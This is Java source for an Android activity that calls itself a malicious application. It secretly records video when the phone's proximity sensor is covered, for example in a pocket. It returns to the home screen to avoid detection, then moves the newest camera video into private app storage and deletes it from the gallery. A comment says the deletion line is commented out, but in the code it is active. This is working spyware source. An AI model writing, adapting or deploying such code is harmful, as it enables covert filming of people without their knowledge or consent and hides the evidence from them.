package com.pinci.francesco.spyvideo;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.os.CountDownTimer;
import android.os.Environment;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.ArrayAdapter;
import android.widget.ListView;

import java.io.File;
import java.io.FileFilter;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.channels.FileChannel;

public class StolenVideos extends AppCompatActivity implements SensorEventListener {

    static final int COUNTDOWN_TIME = 4000;

    SensorManager mSensorManager;
    Sensor mProximitySensor;
    Boolean recording;
    CountDownTimer mCountDownTimer;
    File mFilesDir;
    File cameraDirectory;
    String[] recordingsList;
    Intent recordActivityIntent;
    ArrayAdapter arrayAdapter;
    ListView listView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_stolen_videos);

        // check if WRITE_EXTERNAL_STORAGE permission is granted, needed to save recorded video
        checkPermission();

        recording = false;
        // set up variables to receive proximity sensor values
        mSensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        mProximitySensor = mSensorManager.getDefaultSensor(Sensor.TYPE_PROXIMITY);
        mSensorManager.registerListener(this, mProximitySensor,
                SensorManager.SENSOR_DELAY_UI);
        // create intent used to start recording a video
        recordActivityIntent = new Intent();
        recordActivityIntent.setAction("android.media.action.VIDEO_CAMERA");
        // set up a countdown to avoid recording videos when the proximity sensor is accidentally
        // covered
        mCountDownTimer = new CountDownTimer(COUNTDOWN_TIME, COUNTDOWN_TIME) {
            @Override
            public void onTick(long millisUntilFinished) {}

            @Override
            public void onFinish() {
                recording = true;
                startActivity(recordActivityIntent);
            }
        };
        // prepare directories and files needed
        mFilesDir = this.getFilesDir();
        recordingsList = mFilesDir.list();
        // set up the ListView showing the videos present in malicious application's memory space
        arrayAdapter = new ArrayAdapter<String>(this, R.layout.activity_listview,
                recordingsList);
        listView = findViewById(R.id.stolen_videos);
        listView.setAdapter(arrayAdapter);
    }

    // check if WRITE_EXTERNAL_STORAGE permission is granted, otherwise request it
    private void checkPermission() {
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            // Permission is not granted, request the permission
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
                    0);
        }
    }

    // called by the system when the proximity sensor changes detected value
    @Override
    public void onSensorChanged(SensorEvent event) {
        // only consider proximity sensor events
        if (event.sensor.getType() == Sensor.TYPE_PROXIMITY) {
            // check if the app has already started recording a video
            if (!recording) {
                if (event.values[0] == 0.0) {
                    // not recording but proximity sensor activated -> start the countdown
                    // if i'm here, the user has probably the phone close to the ear or in a pocket
                    mCountDownTimer.start();
                }
                else {
                    // not recording and proximity sensor deactivated -> stop CountDown
                    // the proximity sensor got deactivated before the countdown is finished
                    mCountDownTimer.cancel();
                }
            }
            else {
                if (event.values[0] == 0.0) {
                    // recording and proximity sensor activated, just keep recording
                }
                else {
                    // recording but proximity sensor deactivated -> stop recording
                    // show home screen and save last recorded video
                    showHomeScreen();
                    saveLastRecordedVideo();
                }
            }
        }
    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {}

    // stop recording displaying the home screen to avoid user detection
    private void showHomeScreen() {
        Intent homeIntent = new Intent(Intent.ACTION_MAIN);
        homeIntent.addCategory( Intent.CATEGORY_HOME );
        homeIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(homeIntent);
        recording = false;
    }

    // copy last recorded video to malicious application's memory space
    private void saveLastRecordedVideo() {
        mFilesDir = this.getFilesDir();
        // default folder used to save videos by the OS
        File dcimDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        cameraDirectory = new File(dcimDirectory + "/Camera");
        // filter the files in the directory just considering videos
        File[] deviceRecordedVideos = cameraDirectory.listFiles(new FileFilter() {
            @Override
            public boolean accept(File file) {
                if (file.getName().contains(".")) {
                    return (file.getName().substring(file.getName().lastIndexOf(".")).equals(".mp4"));
                }
                else {
                    return false;
                }
            }
        });
        // check to avoid crash if for a problem no video was recorded
        if (deviceRecordedVideos.length <= 0) {
            return;
        }
        File lastRecordedVideo = deviceRecordedVideos[deviceRecordedVideos.length-1];
        // move last recorded video
        // (to delete the video from gallery so that the user won't see it, remove the commented
        // line of code of this function)
        moveFile(lastRecordedVideo, mFilesDir);
        // update the ListView displaying the 'stolen' videos
        updateListView();
    }

    // move a file from 'source' to the directory 'destDir'
    private void moveFile(File src, File destDir) {
        try {
            // rename the recorded video with increasing enumeration
            File dest = new File(destDir.getAbsolutePath()+ "/Record_" + (recordingsList.length+1) + ".mp4");
            FileChannel source = new FileInputStream(src).getChannel();
            FileChannel destination = new FileOutputStream(dest).getChannel();

            if(source != null)
                destination.transferFrom(source, 0, source.size());
            if (source!=null) {
                source.close();
            }
            destination.close();
            // !! uncomment this line to remove the recorded video from gallery
            src.delete();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void updateListView() {
        recordingsList = mFilesDir.list();
        arrayAdapter = new ArrayAdapter<String>(getApplicationContext(), R.layout.activity_listview, recordingsList);
        listView.setAdapter(arrayAdapter);
    }
}
